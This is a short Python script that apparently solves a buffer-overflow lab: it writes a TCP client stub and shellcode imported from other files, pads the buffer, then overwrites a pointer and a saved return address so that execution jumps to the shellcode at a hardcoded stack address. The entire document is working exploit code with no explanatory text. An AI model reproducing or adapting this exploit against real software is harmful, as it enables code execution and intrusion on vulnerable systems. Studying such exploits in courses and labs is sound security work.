from shellcode import shellcode
from tcp_client import tcp_client
import sys
from struct import pack

buf_len = 2048
garbage_len = 2048 - len(tcp_client) - len(shellcode)
ebp = 0xbffea468
code_start = ebp - 0x810

sys.stdout.write(tcp_client)
sys.stdout.write(shellcode)
sys.stdout.write("x"*garbage_len)
sys.stdout.write(pack("<I",code_start)) #overwrite a
sys.stdout.write(pack("<I",ebp + 4)) #overwrite * b to point to return address

sys.stdout.write("\0")
